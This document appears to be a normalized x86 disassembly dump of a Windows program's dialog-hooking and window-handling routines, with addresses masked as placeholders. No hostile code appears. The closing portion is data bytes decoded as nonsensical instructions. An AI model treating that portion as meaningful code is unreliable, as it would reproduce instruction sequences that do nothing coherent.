add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_457f60
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_454500
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_454500
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_457c64
mov edi eax
mov eax ebx
call sub_457c48
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_457c30
mov edi eax
mov eax ebx
call sub_457c7c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_427738
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_427684
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_4277a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a50
mov [ esi + 0x30 ] 0x1
push esi
push sub_42787c
call sub_41aae0
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4277e8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a9c
test bl bl
jle r-xdata
call sub_41ab78
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42781c
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45a9e4
mov cl 0x1
sub_427844
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4033e8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42787c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4278a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427914
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45134c
mov [ ebp - 0x14 ] eax
call sub_451268
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4279d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a2d4
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_4279a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4279b0
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a330
retn
sub_4279b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4279de
mov eax [ ebp - 0x14 ]
call sub_451400
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_451270
retn
sub_427a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_427684
sub_427a94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4277a0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_427b0d
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403198
mov eax [ esi + 0x58 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4277e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_427b48
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4281d0
mov eax edi
mov si 0xffed
call sub_403394
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_427b70
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_4278c8
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_427bb4 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_427b48
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403394
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403394
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403394
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403394
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403394
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_427c6c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_427cf4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_427d26
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_417d30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d2d
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_427d30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419dc8
push ebx
push sub_427cf4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_427d74
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403ee8
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_4041f4
mov eax [ ebx ]
call sub_4043a8
mov dl 0x7c
call sub_40c830
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c830
test eax eax
jne r-xdata
sub_427dc4
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428075
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402b98
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_427d74
mov eax [ ebp - 0x8 ]
call sub_4043a8
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_4043a8
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_404534
mov eax [ ebp - 0xc ]
call sub_4043a8
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402b98
mov eax [ ebx + 0x78 ]
call sub_4043a8
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408728
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_4043a8
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4043a8
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_4085cc
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404448
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_403f80
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_427738
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_427a10
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42807c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f0c
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_4281d0
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_428088
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c830
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_403fd8
inc ebx
mov eax edi
mov edx esi
call sub_4040e0
mov eax esi
call sub_4086dc
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4280d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4281b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_428088
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428088
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408514
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4281bc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428088
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4041a8
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_4281d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42827b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_428088
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_4280d0
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403f3c
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428282
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_428288
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412be0
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4282dc
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403f3c
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_4088b0
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_428344
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_4041a8
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404408
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c62c
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c660
test al al
jne r-xdata
dec ebx
sub_428474
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408d20
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42853e
inc edi
add [ eax ] al
add [ eax ] al
add ah ah
mov bh 0x47
add [ edx + eax * 8 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add al ah
mov bh 0x47
add [ edx + eax * 8 ] al
inc edi
add [ eax ] al
add [ eax ] al
add ah bl
mov bh 0x47
add [ ebx + eax * 8 ] al
inc edi
add [ eax ] al
add [ eax ] al
add al bl
mov bh 0x47
add [ eax ] dh
rol [ edi ] 0x0
add [ eax ] al
add ah dl
mov bh 0x47
add [ edx + eax * 8 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add al dl
mov bh 0x47
add [ eax - 0x3f ] bl
inc edi
add [ eax ] al
add [ eax ] al
add ah cl
mov bh 0x47
add ah bh
retn
sub_4285b6
inc edi
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 - 0x3e57ffb9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42861a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428621
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404970
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_428624
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cbc
call sub_428474
mov eax [ r-xdata ]
call sub_413884
mov eax [ r-xdata ]
call sub_413924
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
sub_428b32
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
imul ebp [ ebx + ebx * 2 ] 0x43
dec ebp
outsd
jbe r-xdata
mov al [ 0x6c00419e ]
jb r-xdata
outsb
push ebx
je r-xdata
loopne r-xdata
dec ecx
outsb
je r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffa65c0041 ]
inc edx
add [ ecx ] al
add bh ch
[ eax + ebp * 4 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x8c789072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x428c3472
add ah bl
sub [ ecx ] eax
add eax 0x78450800
je r-xdata
sahf
inc esp
jb r-xdata
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0028 ] al
inc ebx
add al ah
add [ eax ] al
jmp eax
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
enter 0x4429 0x0
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 ] dl
inc edx
add [ eax - 0x72 ] al
inc edx
add [ edx + eax ] ah
add [ eax ] al
adc al 0x6b
inc ebx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
insb
jae r-xdata
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x3042cc5c
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] bh
inc edi
lea eax [ bx + si ]
xor al 0x8c
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x74 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x42 ] ah
add [ esp + ecx * 4 + 0x42 ] ch
add [ eax + eax ] al
add al ah
sub [ ecx ] al
shl [ ecx + 0x33ec0041 ] 0x40
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add [ eax + 0x6c00419e ] ah
add [ esi + 0x47380042 ] ch
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffa8300041 ]
inc edx
add [ ebx + edx - 0x517bffbc ] al
inc edx
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add al dh
lodsb [ esi ]
inc edx
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add [ esi + eax * 2 + 0x41 ] dl
popad
insb
or [ edi ] dl
inc ecx
add [ eax ] bh
add [ eax ] al
inc [ eax + ebp * 4 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x428d4872
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add bh bh
in al 0xa7
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
jmp esp
0x48ff
add ah dh
test al 0x42
add al ah
fiadd [ ebx ]
adc ch bl
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
push esp
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
inc edx
add [ eax - 0x53 ] cl
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add al cl
sub [ eax + eax + 0x70 ] eax
sbb [ eax + eax - 0x68 ] al
loopne r-xdata
je r-xdata
inc edx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc edx
add al ch
lodsb [ esi ]
add [ ebp + ecx + 0x44 ] ch
add [ eax ] bl
sub al [ eax + eax - 0x50 ]
scasb [ edi ]
inc edx
add al ch
or [ eax + eax - 0x28 ] eax
or al 0x44
add ah bl
stosb [ edi ]
inc edx
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
dec [ eax - 0x57 ]
inc edx
add [ ecx + ebp * 4 + 0x42 ] bl
add [ ecx + ebp * 4 + 0x42 ] ah
add [ eax - 0x5bffbd57 ] dl
test eax 0xad480042
inc esp
